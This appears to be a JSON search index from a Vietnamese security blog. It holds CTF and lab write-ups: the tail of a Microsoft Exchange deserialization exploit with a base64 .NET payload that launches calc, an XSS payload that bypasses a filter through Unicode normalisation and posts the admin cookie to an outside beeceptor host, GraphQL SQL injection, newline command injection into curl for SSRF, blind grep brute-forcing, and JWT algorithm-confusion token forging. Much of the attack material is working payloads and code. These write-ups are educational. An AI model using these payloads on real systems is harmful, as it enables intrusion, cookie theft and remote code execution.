GVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=&amp;lt;/t:BinaryData&amp;gt; &amp;lt;t:Dictionary&amp;gt;&amp;lt;t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryKey&amp;gt;&amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;OrgDO&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryKey&amp;gt;&amp;lt;t:DictionaryValue&amp;gt;&amp;lt;t:Type&amp;gt;Boolean&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;false&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryValue&amp;gt;&amp;lt;/t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryKey&amp;gt;&amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;OrgExtV&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryKey&amp;gt;&amp;lt;t:DictionaryValue&amp;gt;&amp;lt;t:Type&amp;gt;Integer32&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;0&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryValue&amp;gt;&amp;lt;/t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryEntry&amp;gt;&amp;lt;t:DictionaryKey&amp;gt;&amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;OrgChkTm&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryKey&amp;gt;&amp;lt;t:DictionaryValue&amp;gt;&amp;lt;t:Type&amp;gt;Integer64&amp;lt;/t:Type&amp;gt;&amp;lt;t:Value&amp;gt;637729403684086495&amp;lt;/t:Value&amp;gt;&amp;lt;/t:DictionaryValue&amp;gt;&amp;lt;/t:DictionaryEntry&amp;gt;&amp;lt;/t:Dictionary&amp;gt; &amp;lt;/m:UserConfiguration&amp;gt; &amp;lt;/m:UpdateUserConfiguration&amp;gt; &amp;lt;/soap:Body&amp;gt;&amp;lt;/soap:Envelope&amp;gt;Refresh lại trang add-ins, kết quả là process calc được tạoREFERENCEShttps://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-xml-elements-in-exchangehttps://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange" }, { "title": "Chainreaction - DownUnderCTF 2021", "url": "/posts/Chainreaction-DownUnderCTF-2021/", "categories": "Writeups, DownUnderCTF 2021", "tags": "xss, web, unicode normalised", "date": "2021-09-25 15:55:00 +0700", "snippet": "Đây là thời gian mình bắt đầu tham gia các chương trình tìm kiếm bug bounty. Tuy nhiên kết quả mang lại chưa được khả quan 😭. Để xốc lại tinh thần mình quyết định lại chơi CTF. Hi vọng bounty đầu tiên của mình sẽ xuất hiện trong tương lai gần.ReconTrang chủTrang chủ của Chainreaction không có gì đáng bận tâm, ngoại trừ việc ảnh không load được, nhưng hiện tại vẫn không biết lí do thôi bỏ qua. Có hai button đăng ký đăng nhập. Ở đây các form này không khai thác được SQLi. Quan sát một chút form đăng kýTrang đăng kýUsername không được chứa các ký tự &amp;lt; và &amp;gt;. Vậy khả năng cao có thể bypass để khai thác lỗi XSS qua username. Cũng có một điều đặc biệt bên dưới form đăng nhập làm mình chú ýTrang đăng nhậpvậy là có trang đăng nhập riêng cho deverloper, vào luôn xem có gì hay hoTrang đăng nhập cho developerHiểu sương sương nghĩa là nếu bạn có tài khoản thì có thể vào đường dẫn /devchat, đặc biệt hơn nếu có tài khoản admin thì có thể vào /admin. Hiện tại đương nhiên mình không thể vào trang admin được rồi, ngó devchat xem có gì/devchatVậy là có hẳn một trang public luôn đoạn chat nội bộ, đúng với mô tả của challenge 🤣🤣🤣 Hệ thống được xây dựng bởi các sinh viên của trường đại học.Đoạn chat có đề cập đến NFKD =&amp;gt; NFKD normalised exploit. Tiếp theo tạo một tài khoản và đăng nhập, thì có thêm trang profile cho phép thay đổi thông tin cá nhân Trang thông tin tài khoảnTa thấy rằng username được hiển thị lên giao diện thông qua lời chào welcome, thử XSS ở đây xem thế nào.Như vậy hệ thống sử dụng blacklist để kiểm tra thông tin username. Như đã đề cập ở trên, đoạn chat có nhắc đến cái gọi là NFKD, vậy chính xác NFKD là gì và khai thác thế nào mình sẽ trình bày ngắn gọn dưới đây.Unicode Normalization vulnerabilityNormalization (chuẩn hóa) là quá trình thay đổi độ dài biểu diễn nhị phân đối với một ký tự cụ thể. Có hai kiểu tương đương giữa các ký tự là Canonical Equivalence và Compatibility Equivalence (mình không biết nên đưa về tiếng việt thế nào) Các ký tự tương đương theo kiểu Canonical Equivalence sẽ có cùng biểu diễn khi in hoặc hiển thị. Trong khi đó Compatibility Equivalence là kiểu tương đương mềm dẻo hơn khi biểu diễn của hai ký tự tương đương theo kiểu này có thể khác nhau.Có 4 thuật toán chuẩn hóa được định nghĩa theo chuẩn Unicode: NFC, NFD, NFKD và NFKD, mỗi loại áp dụng kỹ thuật chuẩn hóa Canonical và Compatibility theo cách khác nhau. Bạn có thể đọc thêm về các kỹ thuật khác nhau tại Unicode.org.Chuẩn hóa Compatibility mềm dẻo hơn do đó có thể bị hacker khai thác để vược qua blacklist. Ví dụ ký tự ‘⑧’ sau khi được chuẩn hóa theo kỹ thuật Compatibility sẽ thành ký tự ‘8’, như vậy hacker có thể dùng ký tự này để vượt qua blacklist chứa ‘8’.Để hiểu rõ hơn về Unicode Normalization cũng như cách khai thác, bạn có thể tham khảo tài liệu sau.Solve challengeNhư vậy đã hiểu sơ qua về các khai thác unicode normalization. Bắt tay vào exploit thôi, các ký tự đại diện mình sẽ cần để bypass blacklist sẽ là ＜(%ef%bc%9c) thay cho ký tự &amp;lt; ＞(%ef%bc%9e) thay cho ký tự &amp;gt; ⁱ (%e2%81%b1) thay cho ký tự iCác ký tự tương đương bạn có thể tìm ở tài liệu sau.Test thử script cơ bản, sử dụng beeceptor như một mockup server để validate. Trường mình sử dụng để XSS sẽ là username trong trang profile&amp;lt;script&amp;gt; var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;,&quot;https://hoangnd.free.beeceptor.com&quot;); xhr.send();&amp;lt;/script&amp;gt;Để bypass blacklist, mình sẽ thay thế các ký tự &amp;lt; &amp;gt; i bằng các ký tự tương đương ở trên (ký tự i để bypass chuỗi ‘script’). Như vậy payload của mình sẽ là%ef%bc%9cscr%e2%81%b1pt%ef%bc%9e var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;,&quot;https://hoangnd.free.beeceptor.com&quot;); xhr.send();%ef%bc%9c/scr%e2%81%b1pt%ef%bc%9eKết quả gửi requestVậy là đã tạo được một node script để chèn javascript, bên beeceptor cũng đã nhận được requestOke, đến đây để mạo danh admin, cần phải có được cookie đăng nhập của admin. How? Đầu tiên cần quay lại một chút trang chát chít của hội dev. Chính ông admin đã tiết lộ như sauDo tính năng của trang admin chưa được hoàn thành, admin sẽ sử dụng 1 cookie tĩnh để xác thực, browser của admin chắc chắn còn lưu cookie này. Thế làm thế nào để admin mở profile tài khoản của mình để kích hoạt XSS gửi cookie về cho beeceptor? Câu trả lời nằm ở tính năng report ở trang profileNghĩa là mình cứ ấn report là ông admin sẽ vào trang profile để check lỗi =&amp;gt; XSS. Test nhanh kẻo nguội bằng payload sau%ef%bc%9cscr%e2%81%b1pt%ef%bc%9e var c = document.cookie; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;,&quot;https://hoangnd.free.beeceptor.com/exploit&quot;); xhr.send(c);%ef%bc%9c/scr%e2%81%b1pt%ef%bc%9eKết quả gửi requestTiếp theo là ấn report và quan sát bên beeceptorVậy là đã lấy được cookie của admin, vào /admin lấy cờ thôi" }, { "title": "All Baked Up - H@cktivityCon 2021 CTF", "url": "/posts/all-baked-up-h@cktivitycon-2021-ctf/", "categories": "Writeups, H@cktivityCon 2021 CTF", "tags": "graphql, web, sqli", "date": "2021-09-19 22:00:00 +0700", "snippet": "GraphQLVì challenge này liên quan đến graphql và mình chưa biết về cái này nên sẽ mô tả qua ở đây một chút. GraphQL là ngôn ngữ truy vấn cho các API và runtime để thực hiện các truy vấn đó với dữ liệu. Nghĩa là người dùng sẽ tương tác với API thông qua graphqlMục đích của graphql là tạo ra một endpoint đơn giản dễ hiểu dễ sử dụng để handle tất cả các endpoint phức tạp còn lại. Về operation trong graphql có hai kiểu chính là query và mutation. Ở đây query tương đương với câu lệnh select bình thường, trong khi đó mutation thường thực hiện các thao tác thay đổi bên trong dữ liệu (create, update, delete). Để dễ hình dung thì ý tưởng của query và mutation tương đương với get, post về mặt convention.Solve challengeAll Baked Up là một trang web được dùng để lưu giữ các công thức làm bánh. Chức năng chỉ dừng lại ở trang liệt kê danh sách và truy cập cụ thể vào công thức của từng loại bánh.Phân tích các request của nóVậy là trang web sử dụng công nghệ graphql để thực hiện truy vấn. Phân tích qua một chút về payload trong request của bài nàyTruy vấn được thực hiện có tên là UserQuery, kiểu truy vấn là Query. Bên trong truy vấn thực hiện lấy post thông qua việc kiểm tra thuộc tính name. Bây giờ thử detect sqli xem thế nào, ở đây mình thử detect trong trường name bằng dấu ‘Kết quả trả về lỗi sql, như vậy có thể thực hiện sqli ở trường này, tiếp tục sqli với union mình thu đượcVậy có thể retrieve dữ liệu thông qua các vị trí 2,3,4,6. Tiếp theo là bước SQLi đơn giản mình xin phép lướt qua. Kết quả mình đạt được là trang web sử dụng cơ sở dữ liệu SQLite, có hai table là users và posts. Bên trong posts không có gì hay ho vì đã hiển thị hên lên giao diện người dùng rồi. Kiểm tra users thì thấy có một user duy nhất là tên của tác giả bài này.Như vậy mình đã có được thông tin đăng nhập của một user, tuy nhiên trang đăng nhập ở đâu ??????. Sau đó mình sử dụng công cụ Gobuster để kiểm tra các endpoint, tuy nhiên không có bất kỳ endpoint nào cho việc đăng nhập. Để ý kỹ thì trong request của mình có trường session, decode ra thấy thông tin đăng nhập là guest, hẳn là phải có một cách thức đăng nhập nào đó.Sau đó mình tìm kiếm các lỗi graphql trên mạng, và tìm thấy có thứ gọi là __schema. Đây là một system type chứa các thông tin về query cũng như mutation (tương tự information_schema của Mysql). Ăn sẵn bê luôn payload trên mạng vào 🙏.&quot;query&quot;:&quot;query UserQuery {\\n__schema{\\nqueryType{\\nname\\n}mutationType{\\nname\\n}subscriptionType{\\nname\\n}types{\\n...FullType\\n}directives{\\nname description locations args{\\n...InputValue\\n}\\n}\\n}\\n}fragment FullType on __Type{\\nkind name description fields(includeDeprecated:true){\\nname description args{\\n...InputValue\\n}type{\\n...TypeRef\\n}isDeprecated deprecationReason\\n}inputFields{\\n...InputValue\\n}interfaces{\\n...TypeRef\\n}enumValues(includeDeprecated:true){\\nname description isDeprecated deprecationReason\\n}possibleTypes{\\n...TypeRef\\n}\\n}fragment InputValue on __InputValue{\\nname description type{\\n...TypeRef\\n}defaultValue\\n}fragment TypeRef on __Type{\\nkind name ofType{\\nkind name ofType{\\nkind name ofType{kind name ofType{\\nkind name ofType{\\nkind name ofType{\\nkind name ofType{\\nkind name\\n}\\n}\\n}\\n}\\n}\\n}\\n}\\n}\\n&quot;Kết của trả về chứa các query và mutation được hỗ trợ, ở đây mình tìm thấy một query để lấy flag{ &quot;args&quot;: [ ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;flag&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null }}Thử luôn xem lấy được flag khôngVậy là bắt buộc phải đăng nhập và lấy được token. Tiếp tục tìm kiếm bên trong __schema, mình tìm thấy một mutation xác thực user{ &quot;args&quot;: [{ &quot;defaultValue&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;name&quot;: &quot;username&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;name&quot;: null, &quot;ofType&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null } } }, { &quot;defaultValue&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;name&quot;: &quot;password&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;name&quot;: null, &quot;ofType&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null } } } ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;authenticateUser&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;OBJECT&quot;, &quot;name&quot;: &quot;Auth&quot;, &quot;ofType&quot;: null }}Từ thuộc tính type mình biết được mutation này trả về object kiểu Auth, ngay dưới mutation này có mô tả về type Auth{ &quot;description&quot;: &quot;Auth info for a user&quot;, &quot;enumValues&quot;: null, &quot;fields&quot;: [{ &quot;args&quot;: [ ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;The token&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;token&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;SCALAR&quot;, &quot;name&quot;: &quot;String&quot;, &quot;ofType&quot;: null } }, { &quot;args&quot;: [ ], &quot;deprecationReason&quot;: null, &quot;description&quot;: &quot;The user&quot;, &quot;isDeprecated&quot;: false, &quot;name&quot;: &quot;user&quot;, &quot;type&quot;: { &quot;kind&quot;: &quot;NON_NULL&quot;, &quot;name&quot;: null, &quot;ofType&quot;: { &quot;kind&quot;: &quot;OBJECT&quot;, &quot;name&quot;: &quot;User&quot;, &quot;ofType&quot;: null } } } ], &quot;inputFields&quot;: null, &quot;interfaces&quot;: [ ], &quot;kind&quot;: &quot;OBJECT&quot;, &quot;name&quot;: &quot;Auth&quot;, &quot;possibleTypes&quot;: null}Bên trong Auth có trường token. Túm váy lại, mình sẽ tạo mutation và truyền vào username và password sau đó lấy token từ response cho việc xác thực. Payload cuối cùng để đăng nhập như sau{ &quot;operationName&quot;:&quot;UserMutation&quot;, &quot;variables&quot;:{ &quot;username&quot;:&quot;congon4tor&quot;, &quot;password&quot;:&quot;n8bboB!3%vDwiASVgKhv&quot; }, &quot;query&quot;:&quot;mutation UserMutation($username:String!, $password:String!) {\\nauthenticateUser(username:$username, password:$password){\\ntoken\\n}\\n}\\n&quot;}Lấy được token rồi, quay lại lấy flag thôi. Thêm header Authorization vào request." }, { "title": "OPA Secret - H@acktivityCon 2021 CTF", "url": "/posts/opa-secret-h@cktivitycon-2021-ctf/", "categories": "Writeups, H@cktivityCon 2021 CTF", "tags": "ssrf, web", "date": "2021-09-19 15:55:00 +0700", "snippet": "OPA secret là một trang web cho phép bạn quản lý các khóa bí mật của mình, có chức năng đăng ký đăng nhập. Giao diện quản lý các khóa như sauỞ đây có các chức năng tạo khóa, thay đổi giá trị khóa và phân quyền read và writeỞ phần setting tài khoản, có thể đặt ảnh đại diện cho tài khoản bằng url dẫn tới ảnh, cái này có tiềm năng cho tấn công ssrf.Oke vậy là đã đi qua các chức năng của trang web, giờ cần ngó sang phần mã nguồn, toàn bộ phần xử lý backend được thực hiện bên trong app.py. Sau một hồi xem xét mình thấy các hàm xử lý có gọi đến một internal urlkhả năng cao là web còn thay đổi dữ liệu của database chứ không chỉ thao tác với dữ liệu qua các biến mảng. Kết hợp điều này với chức năng thay đổi ảnh đại diện kết quả sẽ là SSRF.Tiếp theo là xem xét flag nằm ở đâu. Trang web này khi vừa chạy sẽ tự động tạo ra một số account và khóa ban đầu. Trong đó khóa flag thuộc về user adminOke vậy để lấy được cờ thì mình phải có trong tay một tài khoản user có quyền ít nhất là read cái khóa này. Kiểm tra chức năng phân quyền khóaHàm add_reader thực thi công việc thêm quyền read khóa cho một user theo id của user đó, để đỡ mất công mình sẽ lấy luôn id của một trong các tài khoản được tạo ban đầu khỏi cần tạo tài khoản khác{&quot;id&quot;:&quot;243eae36-621a-47a6-b306-841bbffbcac4&quot;}và id khóa flag như sau{&quot;id&quot;: &quot;afce78a8-23d6-4f07-81f2-47c96ddb10cf&quot;}Oke vậy là đã có request để thêm quyền đọc khóa flag cho user của mình. Vì là ssrf nên không cần xác thực gì thêm. Tiếp theo xem đoạn code xử lý thay ảnh đại diện, như đã nói ở trên đây là vị trí tiềm răng cho ssrf.Url ảnh được đưa qua blacklist, sau đó được gọi bằng os command là curlcmd = f&quot;curl --request GET {url} --output ./static/images/{user[&#39;id&#39;]} --proto =http,https&quot;status = os.system(cmd)Ở đây command bắt buộc là get, tuy nhiên request mình cần là put. Như vậy mình cần tạo thêm một curl request nữa thông qua url. Ở đây có một kỹ thuật sử dụng %0a là url encode của ký tự xuống hàng.Khi này command được thực thi bởi os sẽ bị tách ra làm hai command riêng. Sau khi thử nghiệm thì url đầy đủ của mình như sauurl=https://i.pinimg.com/originals/d0/e0/60/d0e06034b750ed272354454ec3ef9dc2.jpg%0acurl%20--request%20PUT%20--header%20&quot;Content-Type:%20application/json&quot;%20--data%20[b2f0aa09-4a78-4bfd-9367-8f0e77d05efd]%20http://localhost:8181/v1/data/readers/afce78a8-23d6-4f07-81f2-47c96ddb10cfKết quả gửi requestVậy là đã thêm quyền đọc flag thành công, bây giờ chỉ cần gọi request để lấy value của khóa thôi" }, { "title": "Availability - H@cktivityCon 2021 CTF", "url": "/posts/availability-h@cktivitycon-2021-ctf/", "categories": "Writeups, H@cktivityCon 2021 CTF", "tags": "brute force, web", "date": "2021-09-19 15:55:00 +0700", "snippet": "Availability là một trong 3 bài về tính bảo mật CIA, trong 3 bài thì bài này được đánh giá là hard. Tương tự như 2 bài kia. Trang web chỉ có một giao diện duy nhất cùng một ô input.Trang web này giúp chúng ta kiểm tra tính sẵn sàng của một host bất kỳDo chỉ có một chức năng duy nhất nên chỉ cần bắt request và thay đổi payload thôi. Dạng bài này khá là cục súc. Tương tự bài Integrity mình sử dụng %0a (xuống dòng) để tạo command mới.Nhưng làm thế nào để xác định command mới đã được chạy khi trang web bây giờ không trả về bất kỳ thông tin gì như anh em nó. Bí quyết là hàm sleepQuan sát góc dưới cùng bên phải thấy request mất hơn 5s mới được thực hiện, vậy là command đã được chạy. Tiếp theo cần suy nghĩ một chút, do trang web bây giờ không trả về bất kỳ thông tin gì về kết quả chạy command nên khả năng cao đây là một dạng Boolean-based command injection. Mình đã thử giời ơi đất hỡi câu lệnh trên mạng về boolean based tuy nhiên không kết quả nào qua được blacklist.Mình quay lại với câu lệnh lọc nội dung file cơ bản là grep. Tương tự như hai bài anh em, bài này flag cũng được giấu trong file flag.txt và flag có định dạng flag{abcxyz}Thử grep với “flag”oke chuẩn. tiếp theo thử một chuỗi cực kỳ vô lý điKết luận, nếu chuỗi mình đưa vào không nằm trong flag thì sẽ báo lỗi, có thì sẽ thành công. Dựa vào cái này để brute force được đầy đủ flag. May mắn là các ký tự trong cờ không quá phức tạp nên việc brute force đỡ mất thời gian.Kết quả brute force dừng lại ở 1 chuỗiVậy flag sẽ là flag{c11d098dd25a08816027174c14f7bf60}.Ban đầu mình không sử dụng grep là do grep sẽ không trả về lỗi nên khả năng không boolean-based được. Kinh nghiệm rút ra cho các bạn là cứ thử tất 😆." }, { "title": "HTB Under Construction", "url": "/posts/htb-under-construction/", "categories": "Writeups, HackTheBox", "tags": "sqli, jwt", "date": "2021-09-06 02:07:00 +0700", "snippet": "Under Contruction dẫn người dùng thẳng vào một trang loginMình đã thử detect SQLi ở đây tuy nhiên không thể khai thác được gì, thử đăng ký một tài khoản đơn sau đó login vàoOK giao diện này là lý do challenge có tên là ‘under construction’ 😂😂. Và trong giao diện này không hề có thêm chức năng gì. Thử xem cookie có gì hay không ? session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MzA4NTc1NDF9.EU9cSpXjqAbjMwbg68QSKDpv-StQSWvjjHhI_5-4eNbyEk_sfnKcsFShYChzc3YsISG6ZNB58yfegyaK6SC41tBrmXBJb2U80eLk1F5QWf6PKsjVWXnPbNIcse6iCSd6UR0gVdXCN5q0I6VesipTr0dGRloUKYkAGEb17FUt2k1xdMPCLiinNXIQZ_3i4Gd0hpvo9rqA4HVWRWZgNqUL5O2qrm1otx8OpdGg4InWy9WaC9TiyLAdjkUtJSNdn_1IiiYn0tt8858jWyaVAm_-EEztGDikfkghdYehkuFEum7fZ0f4Ut9YgjjkFN6CQu4mg5RK5WcfGiq6uf69Y7AOrwNhận thấy rằng session này có dạng aa.bb.cc =&amp;gt; Khả năng cao session này là Json Web Token (Jwt). Sau khi thử thay đổi nhỏ trên giá trị session, mình nhận được lỗi 500 từ server.Vậy blackbox chỉ dừng lại với các chỗ cần lưu ý là form đăng ký đăng nhập và session. Việc cần làm tiếp theo là review code.// AuthMiddleware classmodule.exports = async (req, res, next) =&amp;gt; { try{ if (req.cookies.session === undefined) return res.redirect(&#39;/auth&#39;); let data = await JWTHelper.decode(req.cookies.session); req.data = { username: data.username } next(); } catch(e) { console.log(e); return res.status(500).send(&#39;Internal server error&#39;); }}Hệ thống sử dụng middleware AuthMiddleware để kiểm tra user đã đăng nhập hay chưa bằng cách decode jwt token để lấy được username. Sau đó username này được đưa vào hàm DBHelper.getUser để lấy thông tin user đã đăng nhập.// DBHelper classgetUser(username){ return new Promise((res, rej) =&amp;gt; { db.get(`SELECT * FROM users WHERE username = &#39;${username}&#39;`, (err, data) =&amp;gt; { if (err) return rej(err); res(data); }); });}Đoạn code này đưa username được lấy từ token vào câu query =&amp;gt; SQLi.Tiếp theo để exploit được cần tạo một token thủ công hợp lệ. Do mình chỉ hiểu cơ bản và biết cách sử dụng jwt mà không quan tâm lắm đến thuật toán mã hóa mà nó sử dụng, nên cần bỏ thời gian để tìm hiểu thêm. Sau một thời gian thì tìm được một tài liệu về một lỗi tồn tại bên trong các thư viện jwt. Algorithm confusion In many JWT libraries, the method to verify the signature is: verify(token, secret) – if the token is signed with HMAC verify(token, publicKey) – if the token is signed with RSA or similar Unfortunately, in some libraries, this method by itself does not check whether the received token is signed using the application’s expected algorithm. That’s why in the case of HMAC this method will treat the second argument as a shared secret and in the case of RSA as a public key.If the public key is accessible within the application, an attacker can forge malicious tokens by: Changing the algorithm of the token to HMAC Tampering with the payload to get the desired outcome Signing the malicious token with the public key found in the application Sending the JWT back to the application The application expects RSA encryption, so when an attacker supplies HMAC instead, the verify() method will treat the public key as an HMAC shared secret and use symmetric rather than asymmetric encryption. This means that the token will be signed using the application’s non-secret public key and then verified using the same public key.Hệ thống sinh token sử dụng mã hóa bất đối xứng RS256async sign(data) { data = Object.assign(data, {pk:publicKey}); return (await jwt.sign(data, privateKey, { algorithm:&#39;RS256&#39; }))},async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: [&#39;RS256&#39;, &#39;HS256&#39;] }));}Tuy nhiên verify lại cho phép mã hóa đối xứng HS256. Khi đó có thể tạo ra một token hợp lệ bằng thuật toán mã hóa đối xứng HS256 và public key. Khi token được verify, jwt sẽ coi public key như là shared key.Public key có được bằng cách decode token lấy được sau khi đăng nhập.Đến đây mình sử dụng các tool online tuy nhiên qua bao nhiêu lần tạo token hệ thống đều trả về lỗi 500 😶. Quá cay cú mình code lại đoạn sinh token theo đúng ngôn ngữ và framework của challenge.const jwt = require(&#39;jsonwebtoken&#39;);var publicKey = &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\\n0wIDAQAB\\n-----END PUBLIC KEY-----\\n&quot;var payload = { &quot;username&quot;: &quot;hoangnd&quot;, &quot;pk&quot;: &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\\n0wIDAQAB\\n-----END PUBLIC KEY-----\\n&quot;, &quot;iat&quot;: 1630851097}var token = console.log(jwt.sign(payload, publicKey)) // Mặc định hàm sign sẽ sử dụng mã hóa đối xứng HS256Sau khi sử dụng token từ code này thì worked. 